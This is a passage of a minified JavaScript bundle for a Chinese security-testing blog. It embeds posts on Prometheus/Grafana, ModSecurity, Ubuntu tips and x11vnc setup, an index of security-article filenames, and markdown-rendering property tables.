* 模型服务崩溃

---

# 13. 总结

Prometheus + Grafana 是目前最主流的开源监控方案之一。

优点：

* 部署简单
* 扩展性强
* 可视化优秀
* 云原生友好
* 适合 AI/GPU 场景

对于：

* AI 平台
* GPU 推理
* 大模型服务
* Docker 集群

都非常适合。
`,Zb=`---
title: 什么是 ModSecurity
date: 2026-05-23
summary: ModSecurity 是适用于 Apache、IIS 和 Nginx 的开源跨平台 Web 应用防火墙引擎。
tags: ModSecurity, WAF, Web 安全防护
cover: app-green
readingTime: 3 分钟
featured: true
---

# 简介

## ModSecurity

ModSecurity，在其官网的介绍是：用于 Apache、IIS 和 Nginx 的开源、跨平台 Web 应用程序防火墙（WAF）引擎。ModSecurity 在加载\`规则文件\`后能为你的 Web 应用网站阻拦来自应用层的攻击，如 SQL 注入、XSS 攻击、PHP 代码注入、命令注入等。

[link](https://github.com/SpiderLabs/ModSecurity)

## 规则文件

规则文件指的是 ModSecurity 的核心规则集（CRS），该规则集目前由 OWASP 开源基金会维护。

[link](https://github.com/coreruleset/coreruleset)
`,e_=`---
title: Ubuntu 使用小技巧
date: 2026-05-22
summary: 迁移旧博客中 Ubuntu 使用过程中积累的小技巧，包括 vi 输入异常、root SSH 登录和 IP 配置。
tags: Ubuntu, Linux, 运维基础
cover: app-orange
readingTime: 6 分钟
featured: false
---

# 简介

一些使用 Ubuntu 过程中积累的小技巧。

## ubuntu（desktop）使用 vi 编辑器时输入异常且按方向键乱码

* 卸载

    sudo apt-get remove vim-common

* 安装

    sudo apt-get install vim

## 开启 root 登录 ssh 的方式（实践版本为 20.04）

* 设置 root 密码

    sudo passwd root

* 修改 ssh 配置

    sudo vim /etc/ssh/sshd_config

\`\`\`
PermitRootLogin without-password
修改为
PermitRootLogin yes
\`\`\`

* 重启 sshd 服务

    sudo systemctl restart sshd

## 修改 IP 地址

ubuntu18 以后的 IP 配置文件一般存放在 /etc/netplan/****.yaml 文件中，所以修改 IP 相关信息得修改该文件。

* sudo vi /etc/netplan/****.yaml

文件示例：

\`\`\`
network:
  ethernets:
    ens233:     #配置的网卡的名称
      addresses: [192.168.2.2/24]    #配置的静态ip地址和掩码
      dhcp4: no    #关闭DHCP，需要打开DHCP则写yes
      optional: true
      gateway4: 192.168.2.254    #网关地址
      nameservers:
         addresses: [192.168.31.1,114.114.114.114]    #DNS服务器地址，多个DNS服务器地址需要用英文逗号分隔开
  version: 2
  renderer: networkd    #指定后端采用systemd-networkd或者Network Manager，可不填写则默认使用systemd-workd
\`\`\`

* 重新应用 yaml 配置文件

    sudo netplan apply
`,t_=`---
title: Ubuntu 配置 x11VNC
date: 2026-05-21
summary: 迁移旧博客中 Ubuntu 安装、启动 x11VNC 并配置 systemd 自动启动的步骤。
tags: Ubuntu, x11VNC, 远程桌面
cover: app-pink
readingTime: 6 分钟
featured: false
---

# 简介

x11VNC 是一个 VNC 服务器，它允许人们使用任何 VNC viewer 远程查看并控制真实的 X 显示器（即与物理显示器、键盘和鼠标相对应的显示器）。

## Ubuntu&x11VNC

* 更新源

    sudo apt-get update

* 修改显示器管理器为 lightdm

    sudo apt-get install lightdm

* 重启系统

    sudo reboot

* 安装 x11VNC

    sudo apt-get install x11vnc

* 设置密码（x11vnc）密码默认保存在 /home/\\<username\\>/.vnc/passwd 文件中

    x11vnc -storepasswd （根据提示输入密码，保存密码至默认文件选择“Y”）

* 启动 x11vnc

    x11vnc -forever -shared -rfbauth ~/.vnc/passwd

## 配置 x11vnc 开启自动启动

* 创建 /lib/systemd/system/x11vnc.service 文件并加入下列内容

    sudo gedit /lib/systemd/system/x11vnc.service

文件内容如下：

\`\`\`
[Unit]
Description=Start x11vnc.
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/bin/x11vnc -auth guess -forever -loop -noxdamage -repeat -rfbauth /home/<username>/.vnc/passwd -rfbport 5900 -shared

[Install]
WantedBy=multi-user.target
\`\`\`

* 启动服务（之后每次启动登录后，x11vnc 就会自动运行了）

    sudo systemctl daemon-reload

    sudo systemctl enable x11vnc.service

    sudo systemctl start x11vnc.service
`,n_="/Fyf_blog/assets/Pasted%20Graphic%2011-VbWuNAWF.png",r_="/Fyf_blog/assets/Pasted%20Graphic%202-BUcDc_du.png",i_="/Fyf_blog/assets/Pasted%20Graphic%203-Cvb040l8.png",a_="/Fyf_blog/assets/Pasted%20Graphic%204-BkJJw8Vd.png",u_="/Fyf_blog/assets/Pasted%20Graphic%205-DtUONwsq.png",o_="/Fyf_blog/assets/Pasted%20Graphic%207-BfVYc6Cs.png",s_="/Fyf_blog/assets/image-B9_cFzQW.png",l_="/Fyf_blog/assets/%E4%B8%80%E7%82%B9%E7%BB%8F%E9%AA%8C-Bnbqyip-.png",c_="/Fyf_blog/assets/%E4%BB%B7%E5%80%BC2-BrkOAEyK.png",d_="/Fyf_blog/assets/%E5%AE%9E%E7%8E%B0%E7%9A%842_Skills-DhaHglq4.png",f_="/Fyf_blog/assets/%E6%A8%A1%E5%9E%8B%E5%AF%B9%E6%AF%94-CF8Gqxjs.png",h_="/Fyf_blog/assets/%E6%B3%A8%E6%84%8F%E8%A6%81%E7%82%B9-G0rOQPl2.png",p_="/Fyf_blog/assets/%E7%94%9F%E6%88%90%E6%B5%8B%E8%AF%95%E7%82%B9-FB44YAIh.png",m_="/Fyf_blog/assets/%E7%94%9F%E6%88%90%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B-Ctkpq21A.png",g_="/Fyf_blog/assets/%E7%94%9F%E6%88%90%E7%9A%84%E6%B5%8B%E8%AF%95%E7%82%B9-BsNPaNaX.png",E_="/Fyf_blog/assets/%E7%94%9F%E6%88%90%E7%9A%84%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B-DyEc40oL.png",T_="/Fyf_blog/assets/%E8%83%8C%E6%99%AF-BAuc8uqW.png",b_="/Fyf_blog/assets/%E8%AE%A2%E9%98%85-DD6TqQIH.png",__="/Fyf_blog/assets/listing1-DM8yWVtq.png",S_="/Fyf_blog/assets/listing2-D4xa4YG5.png",y_="/Fyf_blog/assets/RCE-xuIzroJe.png",C_="/Fyf_blog/assets/ssrf-CsoyhKC1.png",X0="../content/posts/";function x_(e){return e.trim().replace(/\s+/g,"-")}function A_(e){return Array.from(new Set(e.filter(t=>!!t)))}const L_=Object.assign({"../content/posts/AI 实践/skills_experience/分享.md":xb,"../content/posts/AI 实践/壁仞上部署大模型.md":Ab,"../content/posts/AI 实践/海光上部署大模型.md":Lb,"../content/posts/安全研究/CRLF injection/CRLF_injection.md":kb,"../content/posts/安全研究/CSRF/CSRF.md":Ib,"../content/posts/安全研究/Directory listing/Directory_listing.md":Nb,"../content/posts/安全研究/Directory_traversal/Directory_traversal.md":vb,"../content/posts/安全研究/Email injection/Email_injection.md":Rb,"../content/posts/安全研究/HTML injection/HTML_injection.md":Ob,"../content/posts/安全研究/IDOR/IDOR.md":Pb,"../content/posts/安全研究/JSON injection/JSON_injection.md":wb,"../content/posts/安全研究/LFI/Local_file_inclusion.md":Db,"../content/posts/安全研究/NoSQL injection/NoSQL_injection.md":Mb,"../content/posts/安全研究/OScmd/OS_command_injection.md":Fb,"../content/posts/安全研究/RCE/Remote_code_execution.md":Bb,"../content/posts/安全研究/RFI/Remote_file_inclusion.md":Hb,"../content/posts/安全研究/SQLi/SQLiType/Blind-SQLi.md":Ub,"../content/posts/安全研究/SQLi/SQLiType/In-band-SQLi.md":zb,"../content/posts/安全研究/SQLi/SQLiType/Out-of-band-SQLi.md":Wb,"../content/posts/安全研究/SQLi/SQL注入备忘录.md":jb,"../content/posts/安全研究/SSRF/SSRF.md":Qb,"../content/posts/安全研究/XSS/XSSType/Blind_XSS.md":Yb,"../content/posts/安全研究/XSS/XSSType/DOM-based_XSS.md":Xb,"../content/posts/安全研究/XSS/XSSType/Reflected_XSS.md":Gb,"../content/posts/安全研究/XSS/XSSType/Stored_XSS.md":Vb,"../content/posts/安全研究/XSS/XSS备忘录.md":$b,"../content/posts/安全研究/XXE/Out-of-band_XML_external_entity.md":qb,"../content/posts/安全研究/XXE/XML_external_entity.md":Kb,"../content/posts/系统运维/Grafana_Prometheus.md":Jb,"../content/posts/系统运维/modsecurity-about.md":Zb,"../content/posts/系统运维/ubuntu-tips.md":e_,"../content/posts/系统运维/ubuntu-x11vnc.md":t_}),k_=Object.assign({"../content/posts/AI 实践/skills_experience/Pasted Graphic 11.png":n_,"../content/posts/AI 实践/skills_experience/Pasted Graphic 2.png":r_,"../content/posts/AI 实践/skills_experience/Pasted Graphic 3.png":i_,"../content/posts/AI 实践/skills_experience/Pasted Graphic 4.png":a_,"../content/posts/AI 实践/skills_experience/Pasted Graphic 5.png":u_,"../content/posts/AI 实践/skills_experience/Pasted Graphic 7.png":o_,"../content/posts/AI 实践/skills_experience/image.png":s_,"../content/posts/AI 实践/skills_experience/一点经验.png":l_,"../content/posts/AI 实践/skills_experience/价值2.png":c_,"../content/posts/AI 实践/skills_experience/实现的2_Skills.png":d_,"../content/posts/AI 实践/skills_experience/模型对比.png":f_,"../content/posts/AI 实践/skills_experience/注意要点.png":h_,"../content/posts/AI 实践/skills_experience/生成测试点.png":p_,"../content/posts/AI 实践/skills_experience/生成测试用例.png":m_,"../content/posts/AI 实践/skills_experience/生成的测试点.png":g_,"../content/posts/AI 实践/skills_experience/生成的测试用例.png":E_,"../content/posts/AI 实践/skills_experience/背景.png":T_,"../content/posts/AI 实践/skills_experience/订阅.png":b_,"../content/posts/安全研究/Directory listing/listing1.png":__,"../content/posts/安全研究/Directory listing/listing2.png":S_,"../content/posts/安全研究/src/RCE.png":y_,"../content/posts/安全研究/src/ssrf.png":C_}),I_=Object.entries(L_).map(([e,t])=>{const r=e.split("/"),a=r.pop()??"",o=r.pop(),s=a.replace(/\.md$/,""),l=e.startsWith(X0)?e.slice(X0.length).replace(/\.md$/,""):s,h=l.split("/"),[p]=h,g=l.includes("/")?p:null,T=g&&(s==="index"||s==="README"||s==="分享")?h.slice(0,-1):h;return{slug:(g?T.map(x_).join("-"):void 0)??(s==="index"||s==="README"||s==="分享"?o??s:s),sourcePath:e,category:g,raw:t}});function N_(e){const t=e.match(/^---\n([\s\S]*?)\n---\n([\s\S]*)$/);if(!t)return{meta:new Map,body:e};const r=new Map;return t[1].split(`
`).forEach(a=>{const o=a.indexOf(":");if(o===-1)return;const s=a.slice(0,o).trim(),l=a.slice(o+1).trim();r.set(s,l)}),{meta:r,body:t[2].trim()}}function v_(e=""){return e.split(",").map(t=>t.trim()).filter(Boolean)}function R_(e="false"){return e.toLowerCase()==="true"}function O_(e,t){return e.match(/^#\s+(.+)$/m)?.[1]?.trim()||t}function P_(e){return e.split(`
`).map(t=>t.trim()).find(t=>t&&!t.startsWith("#")&&!t.startsWith("![")&&!t.startsWith("<!--")&&!t.startsWith("```"))??""}const mi=I_.map(({slug:e,sourcePath:t,category:r,raw:a})=>{const{meta:o,body:s}=N_(a);return{slug:e,sourcePath:t,category:r,title:o.get("title")??O_(s,e),date:o.get("date")??"2026-01-01",summary:o.get("summary")??P_(s),tags:A_([r,...v_(o.get("tags"))]),cover:o.get("cover"),readingTime:o.get("readingTime")??"5 分钟",featured:R_(o.get("featured")),content:s}}).sort((e,t)=>t.date.localeCompare(e.date)),w_=mi.filter(e=>e.featured).slice(0,3);function D_(e){return mi.find(t=>t.slug===e)}function Cp(e){return new Intl.DateTimeFormat("zh-CN",{year:"numeric",month:"long",day:"numeric"}).format(new Date(`${e}T00:00:00`))}function xp({post:e,compact:t=!1}){return v.jsx(vr,{to:`/posts/${e.slug}`,className:"post-card-link",children:v.jsxs(Jt,{className:`post-card ${t?"post-card-compact":""}`,color:e.cover,children:[v.jsxs("div",{className:"post-card-topline",children:[v.jsx("time",{className:"post-published-at",dateTime:e.date,children:Cp(e.date)}),v.jsx("span",{children:e.readingTime})]}),v.jsx("h3",{children:e.title}),v.jsx("p",{children:e.summary}),v.jsx("div",{className:"tag-row",children:e.tags.map(r=>v.jsx("span",{className:"tag",children:r},r))}),v.jsxs("span",{className:"post-card-more",children:["阅读全文 ",v.jsx(Ir,{name:"icon-chat",size:18})]})]})})}const M_=[{key:"web-security",label:"Web 安全防护",children:v.jsx("p",{children:"记录 Web 应用安全测试、防护策略、漏洞验证、攻防链路复盘和安全质量体系建设。"})},{key:"llm-security",label:"大模型安全",children:v.jsx("p",{children:"关注提示注入、越权调用、数据泄露、模型输出安全和智能体应用的安全测试方法。"})},{key:"test-engineering",label:"测试工程",children:v.jsx("p",{children:"以软件测试工程师视角沉淀用例设计、自动化验证、风险评估和质量度量实践。"})}];function F_(){return v.jsxs(v.Fragment,{children:[v.jsxs("section",{className:"hero-section",children:[v.jsx("div",{className:"hero-avatar","aria-label":"云飞头像"}),v.jsxs("div",{className:"hero-copy",children:[v.jsx("span",{className:"eyebrow",children:"Software Test Engineer / Security Defense"}),v.jsx("h1",{children:"云飞的安全测试日志"}),v.jsx("div",{className:"hero-type",children:v.jsx(_p,{speed:70,children:"记录 Web 应用安全防护、大模型安全防护与测试工程实践。"})}),v.jsx("p",{children:"一个面向安全测试与防护实践的个人博客，用轻松的岛屿界面承载严肃的安全工程思考。 这里会持续整理 Web 攻防验证、大模型安全测试、风险评估和质量防护体系。"}),v.jsxs("div",{className:"hero-actions",children:[v.jsx(vr,{to:"/posts",children:v.jsx(va,{type:"primary",size:"large",children:"阅读文章"})}),v.jsx(vr,{to:"/about",children:v.jsx(va,{type:"dashed",size:"large",children:"关于云飞"})})]})]}),v.jsx("div",{className:"hero-visual","aria-label":"岛屿手机视觉组件",children:v.jsx(Y2,{})})]}),v.jsx(Ma,{}),v.jsxs("section",{className:"section-block",children:[v.jsxs("div",{className:"section-heading",children:[v.jsx("span",{className:"eyebrow",children:"Featured Posts"}),v.jsx("h2",{children:"近期精选"})]}),v.jsx("div",{className:"post-grid",children:w_.map(e=>v.jsx(xp,{post:e},e.slug))})]}),v.jsxs("section",{className:"focus-section",children:[v.jsxs(Jt,{className:"focus-card",children:[v.jsxs("div",{className:"section-heading",children:[v.jsx("span",{className:"eyebrow",children:"Topics"}),v.jsx("h2",{children:"写作主题"})]}),v.jsx(yp,{items:M_,defaultActiveKey:"web-security"})]}),v.jsxs("div",{className:"stats-grid",children:[v.jsxs(Jt,{color:"app-yellow",className:"stat-card",children:[v.jsx(Ir,{name:"icon-diy",size:34,bounce:!0}),v.jsx("strong",{children:"安全测试"}),v.jsx("span",{children:"把真实风险拆成可验证场景"})]}),v.jsxs(Jt,{color:"app-teal",className:"stat-card",children:[v.jsx(Ir,{name:"icon-camera",size:34,bounce:!0}),v.jsx("strong",{children:"防护验证"}),v.jsx("span",{children:"关注漏洞复现与防护有效性"})]}),v.jsxs(Jt,{color:"app-blue",className:"stat-card",children:[v.jsx(Ir,{name:"icon-variant",size:34,bounce:!0}),v.jsx("strong",{children:"安全沉淀"}),v.jsx("span",{children:"用 Markdown 维护长期知识库"})]})]})]})]})}function G0(e){const t=[],r=String(e||"");let a=r.indexOf(","),o=0,s=!1;for(;!s;){a===-1&&(a=r.length,s=!0);const l=r.slice(o,a).trim();(l||!s)&&t.push(l),o=a+1,a=r.indexOf(",",o)}return t}function Ap(e,t){const r={};return(e[e.length-1]===""?[...e,""]:e).join((r.padRight?" ":"")+","+(r.padLeft===!1?"":" ")).trim()}const B_=/^[$_\p{ID_Start}][$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,H_=/^[$_\p{ID_Start}][-$_\u{200C}\u{200D}\p{ID_Continue}]*$/u,U_={};function V0(e,t){return(U_.jsx?H_:B_).test(e)}const z_=/[ \t\n\f\r]/g;function W_(e){return typeof e=="object"?e.type==="text"?$0(e.value):!1:$0(e)}function $0(e){return e.replace(z_,"")===""}class Fa{constructor(t,r,a){this.normal=r,this.property=t,a&&(this.space=a)}}Fa.prototype.normal={};Fa.prototype.property={};Fa.prototype.space=void 0;function Lp(e,t){const r={},a={};for(const o of e)Object.assign(r,o.property),Object.assign(a,o.normal);return new Fa(r,a,t)}function Ra(e){return e.toLowerCase()}class Dt{constructor(t,r){this.attribute=r,this.property=t}}Dt.prototype.attribute="";Dt.prototype.booleanish=!1;Dt.prototype.boolean=!1;Dt.prototype.commaOrSpaceSeparated=!1;Dt.prototype.commaSeparated=!1;Dt.prototype.defined=!1;Dt.prototype.mustUseProperty=!1;Dt.prototype.number=!1;Dt.prototype.overloadedBoolean=!1;Dt.prototype.property="";Dt.prototype.spaceSeparated=!1;Dt.prototype.space=void 0;let j_=0;const Ie=Pr(),it=Pr(),rc=Pr(),J=Pr(),Qe=Pr(),hi=Pr(),zt=Pr();function Pr(){return 2**++j_}const ic=Object.freeze(Object.defineProperty({__proto__:null,boolean:Ie,booleanish:it,commaOrSpaceSeparated:zt,commaSeparated:hi,number:J,overloadedBoolean:rc,spaceSeparated:Qe},Symbol.toStringTag,{value:"Module"})),Rl=Object.keys(ic);class bc extends Dt{constructor(t,r,a,o){let s=-1;if(super(t,r),q0(this,"space",o),typeof a=="number")for(;++s<Rl.length;){const l=Rl[s];q0(this,Rl[s],(a&ic[l])===ic[l])}}}bc.prototype.defined=!0;function q0(e,t,r){r&&(e[t]=r)}function _i(e){const t={},r={};for(const[a,o]of Object.entries(e.properties)){const s=new bc(a,e.transform(e.attributes||{},a),o,e.space);e.mustUseProperty&&e.mustUseProperty.includes(a)&&(s.mustUseProperty=!0),t[a]=s,r[Ra(a)]=a,r[Ra(s.attribute)]=a}return new Fa(t,r,e.space)}const kp=_i({properties:{ariaActiveDescendant:null,ariaAtomic:it,ariaAutoComplete:null,ariaBusy:it,ariaChecked:it,ariaColCount:J,ariaColIndex:J,ariaColSpan:J,ariaControls:Qe,ariaCurrent:null,ariaDescribedBy:Qe,ariaDetails:null,ariaDisabled:it,ariaDropEffect:Qe,ariaErrorMessage:null,ariaExpanded:it,ariaFlowTo:Qe,ariaGrabbed:it,ariaHasPopup:null,ariaHidden:it,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:Qe,ariaLevel:J,ariaLive:null,ariaModal:it,ariaMultiLine:it,ariaMultiSelectable:it,ariaOrientation:null,ariaOwns:Qe,ariaPlaceholder:null,ariaPosInSet:J,ariaPressed:it,ariaReadOnly:it,ariaRelevant:null,ariaRequired:it,ariaRoleDescription:Qe,ariaRowCount:J,ariaRowIndex:J,ariaRowSpan:J,ariaSelected:it,ariaSetSize:J,ariaSort:null,ariaValueMax:J,ariaValueMin:J,ariaValueNow:J,ariaValueText:null,role:null},transform(e,t){return t==="role"?t:"aria-"+t.slice(4).toLowerCase()}});function Ip(e,t){return t in e?e[t]:t}function Np(e,t){return Ip(e,t.toLowerCase())}const Q_=_i({attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:hi,acceptCharset:Qe,accessKey:Qe,action:null,allow:null,allowFullScreen:Ie,allowPaymentRequest:Ie,allowUserMedia:Ie,alt:null,as:null,async:Ie,autoCapitalize:null,autoComplete:Qe,autoFocus:Ie,autoPlay:Ie,blocking:Qe,capture:null,charSet:null,checked:Ie,cite:null,className:Qe,cols:J,colSpan:null,content:null,contentEditable:it,controls:Ie,controlsList:Qe,coords:J|hi,crossOrigin:null,data:null,dateTime:null,decoding:null,default:Ie,defer:Ie,dir:null,dirName:null,disabled:Ie,download:rc,draggable:it,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:Ie,formTarget:null,headers:Qe,height:J,hidden:rc,high:J,href:null,hrefLang:null,htmlFor:Qe,httpEquiv:Qe,id:null,imageSizes:null,imageSrcSet:null,inert:Ie,inputMode:null,integrity:null,is:null,isMap:Ie,itemId:null,itemProp:Qe,itemRef:Qe,itemScope:Ie,itemType:Qe,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:Ie,low:J,manifest:null,max:null,maxLength:J,media:null,method:null,min:null,minLength:J,multiple:Ie,muted:Ie,name:null,nonce:null,noModule:Ie,noValidate:Ie,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:Ie,optimum:J,pattern:null,ping:Qe,placeholder:null,playsInline:Ie,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:Ie,referrerPolicy:null,rel:Qe,required:Ie,reversed:Ie,rows:J,rowSpan:J,sandbox:Qe,scope:null,scoped:Ie,seamless:Ie,selected:Ie,shadowRootClonable:Ie,shadowRootDelegatesFocus:Ie,shadowRootMode:null,shape:null,size:J,sizes:null,slot:null,span:J,spellCheck:it,src:null,srcDoc:null,srcLang:null,srcSet:null,start:J,step:null,style:null,tabIndex:J,target:null,title:null,translate:null,type:null,typeMustMatch:Ie,useMap:null,value:it,width:J,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:Qe,axis:null,background:null,bgColor:null,border:J,borderColor:null,bottomMargin:J,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:Ie,declare:Ie,event:null,face:null,frame:null,frameBorder:null,hSpace:J,leftMargin:J,link:null,longDesc:null,lowSrc:null,marginHeight:J,marginWidth:J,noResize:Ie,noHref:Ie,noShade:Ie,noWrap:Ie,object:null,profile:null,prompt:null,rev:null,rightMargin:J,rules:null,scheme:null,scrolling:it,standby:null,summary:null,text:null,topMargin:J,valueType:null,version:null,vAlign:null,vLink:null,vSpace:J,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:Ie,disableRemotePlayback:Ie,prefix:null,property:null,results:J,security:null,unselectable:null},space:"html",transform:Np}),Y_=_i({attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},properties:{about:zt,accentHeight:J,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:J,amplitude:J,arabicForm:null,ascent:J,attributeName:null,attributeType:null,azimuth:J,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:J,by:null,calcMode:null,capHeight:J,className:Qe,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:J,diffuseConstant:J,direction:null,display:null,dur:null,divisor:J,dominantBaseline:null,download:Ie,dx:null,dy:null,edgeMode:null,editable:null,elevation:J,enableBackground:null,end:null,event:null,exponent:J,externalResourcesRequired:null,fill:null,fillOpacity:J,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:hi,g2:hi,glyphName:hi,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:J,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:J,horizOriginX:J,horizOriginY:J,id:null,ideographic:J,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:J,k:J,k1:J,k2:J,k3:J,k4:J,kernelMatrix:zt,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:J,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:J,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numO